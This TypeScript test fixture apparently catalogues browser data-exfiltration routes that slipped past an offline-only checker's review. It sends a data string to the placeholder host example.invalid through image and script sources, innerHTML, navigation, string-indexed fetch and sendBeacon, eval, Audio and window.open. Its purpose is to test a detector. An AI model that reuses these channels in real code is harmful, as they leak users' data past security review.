/**
 * What the first probe (offline-probe.ts) does not have: the ways out the proof let through when it was reviewed (#377). Every function here
 * has one. Nothing imports this file but the proof's own test, and nothing runs it.
 */

export function image(data: string): void {
  const loaded = new (window as unknown as { Image: new () => HTMLImageElement }).Image();
  loaded.src = `https://example.invalid/?${data}`;
}

export function elements(data: string): void {
  const picture = document.createElement("img");
  picture.src = `https://example.invalid/?${data}`;
  const script = document.createElement("script");
  script.src = `https://example.invalid/?${data}`;
  const anchor = document.createElement("a");
  anchor.download = "file.csv";
  void [picture, script, anchor];
}

export function markup(data: string): void {
  document.body.innerHTML = `<img src="https://example.invalid/?${data}">`;
}

export function navigate(data: string): void {
  (window as unknown as { location: string }).location = `https://example.invalid/?${data}`;
  location.search = data;
}

export function bySting(data: string, name: string): void {
  void (window as unknown as Record<string, (url: string) => void>)["fetch"]!(`https://example.invalid/?${data}`);
  void (globalThis as unknown as Record<string, (url: string) => void>)[name]!(data);
  void (navigator as unknown as Record<string, (url: string, body: string) => void>)["sendBeacon"]!("https://example.invalid/", data);
}

export function asCode(data: string): void {
  eval(`fetch("https://example.invalid/?${data}")`);
  void new Function("data", "return data")(data);
  void new Audio(`https://example.invalid/?${data}`);
  open(`https://example.invalid/?${data}`);
}
